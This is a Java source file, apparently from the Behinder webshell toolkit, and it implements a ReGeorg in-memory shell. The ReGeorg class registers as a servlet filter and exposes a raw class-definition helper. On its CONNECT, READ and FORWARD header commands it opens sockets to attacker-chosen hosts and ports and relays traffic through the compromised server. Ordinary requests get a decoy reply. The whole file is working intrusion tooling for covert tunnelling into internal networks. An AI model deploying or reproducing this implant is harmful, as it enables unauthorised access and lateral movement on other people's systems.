package net.rebeyond.behinder.payload.java.memoryshell;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.UnknownHostException;
import java.nio.ByteBuffer;
import java.nio.channels.SocketChannel;
import java.util.Enumeration;

public class ReGeorg extends ClassLoader implements Filter, Servlet, ServletConfig {
    public static String password;
    private FilterConfig filterConfig;

    public ReGeorg() {}
    public ReGeorg(ClassLoader c){
        super(c);
    }

    public Class g(byte []b){
        return super.defineClass(b, 0, b.length);
    }

    public void init(FilterConfig Config) throws ServletException {
        this.filterConfig = Config;
    }

    public void doFilter(ServletRequest request, ServletResponse response, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;
        HttpServletResponse resp = (HttpServletResponse) response;
        HttpSession session = req.getSession();
        String cmd = req.getHeader("X-CMD");
        if (cmd != null) {
            resp.setHeader("X-STATUS", "OK");
            if (cmd.compareTo("CONNECT") == 0) {
                try {
                    String target = req.getHeader("X-TARGET");
                    int port = Integer.parseInt(req.getHeader("X-PORT"));
                    SocketChannel socketChannel = SocketChannel.open();
                    socketChannel.connect(new InetSocketAddress(target, port));
                    socketChannel.configureBlocking(false);
                    session.setAttribute("socket", socketChannel);
                    resp.setHeader("X-STATUS", "OK");
                } catch (UnknownHostException e) {
                    resp.setHeader("X-ERROR", e.getMessage());
                    resp.setHeader("X-STATUS", "FAIL");
                } catch (IOException e) {
                    resp.setHeader("X-ERROR", e.getMessage());
                    resp.setHeader("X-STATUS", "FAIL");

                }
            } else if (cmd.compareTo("DISCONNECT") == 0) {
                SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
                try{
                    socketChannel.socket().close();
                } catch (Exception ex) {
                }
                session.invalidate();
            } else if (cmd.compareTo("READ") == 0){
                SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
                try {
                    ByteBuffer buf = ByteBuffer.allocate(512);
                    int bytesRead = socketChannel.read(buf);
                    ServletOutputStream so = resp.getOutputStream();
                    while (bytesRead > 0){
                        so.write(buf.array(),0,bytesRead);
                        so.flush();
                        buf.clear();
                        bytesRead = socketChannel.read(buf);
                    }
                    resp.setHeader("X-STATUS", "OK");
                    so.flush();
                    so.close();

                } catch (Exception e) {
                    resp.setHeader("X-ERROR", e.getMessage());
                    resp.setHeader("X-STATUS", "FAIL");
                }

            } else if (cmd.compareTo("FORWARD") == 0){
                SocketChannel socketChannel = (SocketChannel)session.getAttribute("socket");
                try {
                    int readlen = req.getContentLength();
                    byte[] buff = new byte[readlen];
                    req.getInputStream().read(buff, 0, readlen);
                    ByteBuffer buf = ByteBuffer.allocate(readlen);
                    buf.clear();
                    buf.put(buff);
                    buf.flip();
                    while(buf.hasRemaining()) {
                        socketChannel.write(buf);
                    }
                    resp.setHeader("X-STATUS", "OK");
                } catch (Exception e) {
                    resp.setHeader("X-ERROR", e.getMessage());
                    resp.setHeader("X-STATUS", "FAIL");
                    socketChannel.socket().close();
                }
            }
        } else {
            resp.getWriter().write("Georg says, 'All seems fine'");
            resp.getWriter().flush();
            resp.getWriter().close();
        }
        filterChain.doFilter(request, response);

    }

    public void init(ServletConfig servletConfig) throws ServletException {
    }

    public ServletConfig getServletConfig() {
        return this;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
    }

    public String getServletInfo() {
        return this.getServletName();
    }

    public void destroy() {
    }

    @Override
    public String getServletName() {
        return "Servlet";
    }

    @Override
    public ServletContext getServletContext() {
        return this.filterConfig.getServletContext();
    }

    @Override
    public String getInitParameter(String s) {
        return s;
    }

    @Override
    public Enumeration<String> getInitParameterNames() {
        return null;
    }


}
